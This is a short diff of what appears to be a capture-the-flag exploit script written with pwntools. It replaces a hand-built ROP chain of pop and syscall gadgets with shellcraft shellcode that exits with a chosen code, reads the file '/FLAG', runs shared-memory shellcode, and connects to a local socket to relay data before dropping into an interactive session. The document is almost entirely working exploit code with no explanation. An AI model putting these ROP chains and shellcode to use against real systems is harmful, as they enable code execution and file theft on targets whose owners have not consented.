@@ -66,16 +66,7 @@ base = int(r.recvline().decode().strip(), 16)
 
 code = bytearray.fromhex(os.popen(f"./codegen {timestamp}").read())
 
-payload = b""
-payload += p64(base + code.find(asm("pop rax; ret")))
-payload += p64(60)
-payload += p64(base + code.find(asm("pop rdi; ret")))
-payload += p64(37)
-payload += p64(base + code.find(asm("syscall; ret")))
-r.recvuntil(b"shell>").decode()
-r.sendline(payload)
-print("shell>", r.recvline().strip().decode())
-print(r.recvline().strip().decode())
+run(shellcraft.amd64.linux.exit(37))
 
 run(shellcraft.amd64.linux.cat("/FLAG", 1))
 
@@ -105,11 +96,10 @@ shm_sc = """
 
 run(shm_sc)
 
-sc = (
-    shellcraft.amd64.linux.connect("localhost", 0x1337, "ipv4")
+run(
+    shellcraft.amd64.linux.connect("localhost", 0x1337)
     + shellcraft.amd64.linux.read(3, "rsp", 0x100)
     + shellcraft.amd64.linux.write(1, "rsp", 0x100)
 )
-run(sc)
 
 r.interactive()
